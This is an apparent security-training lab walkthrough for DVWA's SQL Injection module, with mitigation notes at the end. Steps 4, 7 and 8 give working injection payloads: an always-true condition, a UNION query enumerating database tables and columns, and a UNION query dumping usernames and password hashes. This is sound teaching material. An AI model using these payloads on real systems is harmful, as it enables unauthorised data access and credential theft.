## 🔍 Lab 2: SQL Injection – Lateral Movement via Leaky API

### 💼 Scenario
A helpdesk system fetches user profiles using a numeric ID but exposes raw DB responses without sanitation.

### 🎯 Objective
There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi. Use SQL Injection to enumerate DB tables, dump data, and escalate.

### 🧪 Steps
1. Navigate to DVWA → **SQL Injection** module.

2. Based on the `objective`, we know the database holds five users, each identified by a numeric ID. Entering a user ID returns their first and last names.

3. Click the **View Source** button to inspect the backend SQL query:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```
The SQL query to return `$first` and `$last` fields.

4. To explore beyond this query, manipulate the `$id` parameter by submitting:

```sql
%' or '0'='0
```
This yields the following unsanitized query:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
```

- `%` is a wildcard
- `'0'='0'` always evaluates true
- The quotes align correctly, ensuring valid execution

5. Now let’s try a more advanced SQL injection using `UNION` to combine results from another query. In particular, the `UNION` keyword in SQL combined with a suitable `SELECT` query will expose the underlying database. We call this approach a `SQL injection UNION attack`.

6. MySQL stores metadata in the `information_schema.columns` table, which contains names of all tables and their columns.

7. Use the following input to enumerate table and column names:

```sql
%' UNION SELECT table_name, column_name FROM information_schema.columns #
```

Resulting query:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '%' 
UNION SELECT table_name, column_name FROM information_schema.columns #';
```
- `#` is a comment character that discards the rest of the original query
- We also want to ensure we assign values to the two variables `$first` and `$last` by returning two columns, not one.

8. After identifying the correct table (likely `users`) and columns (`user`, `password`), modify your input to extract credentials:

```sql
%' UNION SELECT user, password FROM users #
```

Which becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '%' UNION SELECT user, password FROM users #';
```
You will now see a list of usernames alongside hashed passwords.

9. We’ve found password hashes instead of plain-text passwords. Cracking passwords is outside the scope of this lab.


### 🧠 Real-World Context
APIs that expose DB queries directly are common in legacy web services. SQLi is still one of the top OWASP vulnerabilities.

### 🛡️ Mitigation
- Always use parameterized queries or ORMs.
- Disable verbose error messages in production.
- Employ WAFs (Web Application Firewall) to block suspicious queries.
